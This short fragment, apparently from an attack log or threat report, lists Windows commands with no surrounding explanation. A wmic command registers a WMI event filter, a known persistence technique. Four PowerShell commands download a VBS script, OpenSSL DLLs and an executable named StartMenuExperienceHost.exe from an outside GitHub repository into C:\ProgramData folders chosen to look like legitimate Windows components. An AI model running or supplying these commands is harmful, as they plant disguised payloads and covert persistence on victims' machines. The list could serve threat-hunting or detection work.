...
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="nut", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 240 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
...
powershell.exe iwr https://github.com/wazgame/waz/raw/main/store.vbs -o C:\ProgramData\SoftwareDistribution\store.vbs
powershell.exe iwr https://github.com/wazgame/waz/raw/main/libssl-1_1.dll -o C:\ProgramData\USOShared\libssl-1_1.dll
powershell.exe iwr https://github.com/wazgame/waz/raw/main/libcrypto-1_1.dll -o C:\ProgramData\USOShared\libcrypto-1_1.dll
powershell.exe iwr https://github.com/wazgame/waz/raw/main/StartMenuExperienceHost.exe -o C:\ProgramData\USOShared\StartMenuExperienceHost.exe
